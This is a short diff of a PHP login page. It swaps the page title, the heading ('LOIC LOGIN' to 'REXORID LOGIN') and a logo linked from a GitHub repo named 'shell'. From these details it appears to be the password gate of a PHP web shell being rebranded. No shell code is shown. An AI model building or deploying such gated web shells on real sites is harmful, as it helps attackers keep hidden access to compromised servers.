@@ -66,7 +66,7 @@ if (is_logged_in()) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LOGIN</title>
+    <title>MLEBU</title>
     <style>
         * {
             padding: 0%;
@@ -110,8 +110,8 @@ if (is_logged_in()) {
 <body>
     <center>
         <form action="" method="post">
-            <img src="https://raw.githubusercontent.com/1llsion/imgAmp/main/demon.png" alt="demon">
-            <h1>LOIC LOGIN</h1>
+            <img src="https://raw.githubusercontent.com/rexorid/shell/main/img/rxrid.png" alt="rxrid">
+            <h1>REXORID LOGIN</h1>
         <input type="password" name="password" id="password" placeholder="pass mu cok" class="pas">
         <input type="submit" value=">" class="log">
     </form>
@@ -120,4 +120,5 @@ if (is_logged_in()) {
 </html>
   <?php
 }
+
 ?>
